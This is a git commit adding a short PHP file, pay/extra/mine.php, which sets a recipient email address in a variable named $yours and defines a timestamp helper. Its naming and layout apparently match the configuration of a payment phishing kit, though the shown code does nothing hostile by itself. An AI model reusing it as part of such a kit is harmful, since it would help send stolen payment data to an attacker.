c1cb4f1af312af26ea7face4b5d6e2b4b63fdfe6
aymenbne548485 <57303307+aymenbne548485@users.noreply.github.com>
2020-11-08 03:46:01 +0100

    Add files via upload

---
+++ pay/extra/mine.php
@@ -0,0 +1,16 @@
+<?php
+	
+
+	// ================================= //
+
+	$yours = "aymen458861@gmail.com";
+
+	// ================================= //
+
+
+	function now() {
+		date_default_timezone_set('GMT');
+		return date("d/m/Y h:i:sa");
+	}
+
+?>
